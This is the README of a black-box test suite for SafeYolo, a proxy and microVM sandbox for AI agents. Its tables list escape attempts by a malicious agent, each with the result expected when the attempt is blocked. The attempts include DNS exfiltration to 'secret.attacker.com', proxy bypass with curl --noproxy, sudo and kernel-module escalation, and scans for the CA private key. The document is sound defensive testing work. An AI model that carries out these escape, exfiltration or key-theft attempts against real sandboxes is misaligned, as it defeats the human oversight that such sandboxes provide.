# Black Box Tests

SafeYolo's trust anchor. These tests prove two things from the adversary's perspective:

1. **SafeYolo does what it claims** — credentials are blocked, domains are enforced, rate limits work
2. **A malicious agent cannot escape** — network bypass, privilege escalation, key theft, and other pentest-style attacks are tested

If these tests pass, the security contract holds. If they fail, nothing else matters.

## Design Principles

**Test from inside the VM.** Every security assertion is proven from the adversary's
vantage point — inside the microVM where the agent runs. If the attacker can't get out,
the implementation is correct regardless of which mechanism enforces it.

**Never duplicate production logic.** Tests use the real proxy with real addons, real pf
rules, real VirtioFS mounts, and real TLS verification. No mocks, no `ssl_insecure=true`,
no shortcuts. A fix to production automatically fixes the tests.

**Ground truth TLS.** The test harness uses a dedicated test CA that signs sinkhole
certificates. SafeYolo verifies these the same way it verifies production certs.
See `certs/README.md` for details.

## Test Suites

### Suite 1: Proxy Functional Tests

Prove that the proxy inspects and enforces policy on all traffic.

| Test | Attack Scenario | Security Property |
|------|----------------|-------------------|
| Credential to authorized host | Normal operation | Forwarded with credential intact |
| Credential to unauthorized host | Exfiltration attempt | 428 + sinkhole receives nothing |
| Request without credentials | Normal operation | Passes through |
| Allowed domain | Normal operation | 200 response |
| Rate limit within budget | Normal operation | All requests succeed |
| Proxy-Authorization header | Header exfiltration | Stripped before forwarding |
| Block response content | Audit trail | Contains event_id and approval guidance |

**Verification method:** Sinkhole server captures all upstream traffic. Tests query the
sinkhole to prove what actually reached the upstream — not what the proxy *said* it blocked.

### Suite 2: VM Isolation Tests

Prove that a malicious agent inside the microVM cannot escape the sandbox. These tests
run from inside a real microVM with the same configuration as production.

#### Network Escape

| Test | Attack Vector | Expected Result |
|------|--------------|-----------------|
| Direct HTTP to external IP | `curl --noproxy '*' http://1.1.1.1` | Connection dropped (pf) |
| Direct HTTPS to external IP | `curl --noproxy '*' https://8.8.8.8` | Connection dropped (pf) |
| DNS exfiltration | `nslookup secret.attacker.com 8.8.8.8` | No route (pf blocks UDP) |
| Raw socket bypass | `SOCK_RAW` to external IP | Dropped at kernel level |
| IP reconfiguration | `ip addr` change to evade pf rules | pf matches original subnet |
| Proxy reachable | `curl` through proxy | 200 (the one allowed path) |

#### Privilege Escalation

| Test | Attack Vector | Expected Result |
|------|--------------|-----------------|
| Run as non-root | Check `id -u` | uid 1000 |
| sudo escalation | `sudo su` | No password, no NOPASSWD |
| Kernel module load | `insmod` / `modprobe` | `CONFIG_MODULES=n` — not supported |
| /dev/mem access | Read physical memory | Device does not exist |
| eBPF load | BPF syscall | Not available in guest |

#### Filesystem Isolation

| Test | Attack Vector | Expected Result |
|------|--------------|-----------------|
| Write to config share | `touch /safeyolo/test` | EROFS (read-only) |
| Read CA private key | Scan all mounted filesystems | Not present in VM |
| Private key in cert content | `grep "PRIVATE KEY"` in cert files | Not found |
| Public cert exists | Check trust store | Present and readable |

### Suite 3: Key Isolation Tests

Prove that the CA private key never enters the VM. This is critical — if an agent obtains
the private key, it can sign certificates for any domain and bypass all inspection.

| Test | Attack Vector | Expected Result |
|------|--------------|-----------------|
| No `.key` files in VM | Scan all mounted volumes | None found |
| No private key in cert files | Content scan of all `.pem`/`.crt` files | No `PRIVATE KEY` block |
| Public cert present | Check `/usr/local/share/ca-certificates/` | `safeyolo.crt` exists |
| Public cert readable | Read cert as agent user | Contains `BEGIN CERTIFICATE` |

## Architecture

```
┌─────────────────────────────────┐
│  microVM (agent perspective)    │
│                                 │
│  ┌──────────┐  ┌─────────────┐ │
│  │  Agent    │  │ Test runner │ │
│  │ (or bash) │  │ (pytest)   │ │
│  └────┬──────┘  └──────┬──────┘ │
│       │ HTTP_PROXY     │        │
│  ─────┼────────────────┼──────  │
│       │    eth0 (feth)  │       │
└───────┼─────────────────┼───────┘
        │ pf rules        │
        ▼                 ▼
┌───────────────┐  ┌─────────────┐
│  mitmdump     │  │  Sinkhole   │
│  (host)       │──│  (captures) │
│  + addons     │  │             │
└───────────────┘  └─────────────┘
```

- **microVM**: Real VM via Apple Virtualization.framework, same config as production
- **mitmdump**: Host-side proxy with full addon chain (credential guard, network guard, etc.)
- **Sinkhole**: Captures upstream traffic to prove what actually reached the destination
- **pf**: macOS packet filter rules enforcing network isolation on feth interfaces
- **Test runner**: pytest inside the VM, proving security properties from the adversary's perspective

## Running

```bash
# All suites
./run-tests.sh

# Proxy functional tests only
./run-tests.sh --proxy

# VM isolation tests only
./run-tests.sh --isolation
```

## Adding Tests

When adding a new test, ask: *"What would a malicious agent try?"*

1. Identify the attack vector (network bypass, privilege escalation, data exfiltration, etc.)
2. Write the test from inside the VM — prove the attack fails
3. If the test involves upstream traffic, use the sinkhole to verify what actually arrived
4. Add the test to the appropriate suite above
